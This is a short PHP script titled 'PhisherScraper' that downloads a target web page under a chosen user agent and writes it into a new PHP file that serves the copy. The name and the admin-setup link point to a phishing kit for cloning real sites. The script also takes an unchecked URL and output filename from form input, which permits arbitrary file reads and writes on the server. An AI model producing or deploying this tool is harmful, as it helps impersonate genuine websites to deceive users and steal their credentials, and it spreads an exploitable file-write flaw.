/* PhisherScraper
 Scrapes page using Google Chrome useragent
 copyright (c) 2011 Mark Scrano mscrano@ieee.org
 version 0.3
*/
<?php
$targetUrl = htmlspecialchars($_POST['targetUrl']);
$phpFile = htmlspecialchars($_POST['phpFile']);
$userAgent = htmlspecialchars($_POST['uagent']);

//change user agent


ini_set('user_agent', $userAgent);
//pull down html from URL
$fileIn = fopen($targetUrl, 'r') or die('Epic Fail...');
$inputWebpage = stream_get_contents($fileIn, -1);
fclose($fileIn);
//replace " and \ <form POST action> 
$before = ("\"");
$after = ("\\\"");
$outputWebpage = str_replace($before, $after, $inputWebpage);
//generate php file
$fileOut = fopen($phpFile, 'w');
fwrite($fileOut, "<?php \$webpage = \"");
fwrite($fileOut, $outputWebpage);
fwrite($fileOut, "\" ?> <?=\"\$webpage\"?>");
fclose($fileOut);
echo "Operation completed";
echo "<br />";
echo " URL:<a href=\"".$targetUrl."\"> ".$targetUrl."</a> processed";
echo "<br />";
echo "File: <a href=\"".$phpFile."\"> ".$phpFile."</a> created";
echo "<br />";
echo "Return to <a href=\"admin.php\">Admin URL setup</a>";
?>
